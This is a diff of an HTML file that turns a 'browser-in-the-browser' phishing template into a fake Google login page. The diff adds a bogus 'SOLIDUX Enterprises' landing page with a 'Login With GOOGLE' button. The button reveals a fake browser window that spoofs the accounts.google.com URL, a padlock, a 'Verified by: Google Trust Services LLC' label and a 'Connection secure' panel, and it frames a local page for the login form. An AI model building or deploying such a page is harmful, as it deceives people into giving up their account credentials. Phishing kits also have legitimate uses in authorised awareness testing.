@@ -4,10 +4,16 @@
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="stylesheet" href="style.css">
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="jquery.min.js"></script>
 </head>
 <body>
-<div id="window">
+	<div style='background-color:rgb(31, 137, 118);border-radius: 10px;width:50%'>
+	<img src="../building.jpg" style="float:right;width:17.5%">
+		<h1 style="color:white">SOLIDUX Enterprises</h1>
+		<h4 style="color:white">Creating YOUR future, today!</h4>
+	<button id="clickme" style="background-color: black;color: white;align-items: center;"> <img src="./logo.png">&nbsp;&nbsp;<b style="bottom:2px;background-color: black;color: white;align-items: center;">Login With GOOGLE</b>
+			</button></div>
+<div id="window" style="display:none">
 <!-- Title bar start -->
 <div id="title-bar-width">
 	<div id="title-bar" class="outer yosemite">
@@ -17,16 +23,30 @@
 	     <div id="maximize" class="dot green"></div>
 	    </span>
 
-	     <span id="logo-description">XX-TITLE-XX</span>
+	     <span id="logo-description">Gmail</span>
 	</div>
 	<div id="url-bar">
 		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
-		<span id="domain-name">XX-DOMAIN-NAME-XX</span>
-		<span id="domain-path">XX-DOMAIN-PATH-XX</span>
+		<span id="domain-name">https://accounts.google.com</span>
+		<span id="domain-path">/v3/signin/identifier?dsh=S1308834313%3A1672917529862905&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AeAAQh4BEkbKkYMgUhTvJlT7drMJIoKG_kBJMCb0TSwXgFNKSiJiwX5Dn-HL_Gd_j3X_f3JYZ3rYpg</span>
 	</div>
 </div>
+<!-- cert preview -->
+<div id="verified-by" >Verified by: Google Trust Services LLC</div>
+
+<div id="certificate-box" class="certificate-box visuallyhidden hidden">
+	<span id="siteinfocert">Site information for accounts.google.com</span>
+	<hr>
+	<span id="lightup">
+		<span>
+			<img src="./ssl.svg" width="20px" height="20px" id="anotherpadloc">
+			<span id="spanconsec">Connection secure<span id="arrow">></span></span>
+		</span>
+	</span>
+</div>
+
 <!-- Content start -->
-<iframe id="content" src="XX-PHISHING-LINK-XX" frameBorder="0"></iframe>
+<iframe id="content" src="iframe_innliner.html" frameBorder="0"></iframe>
 </div>
 </body>
 <script src="script.js"></script>
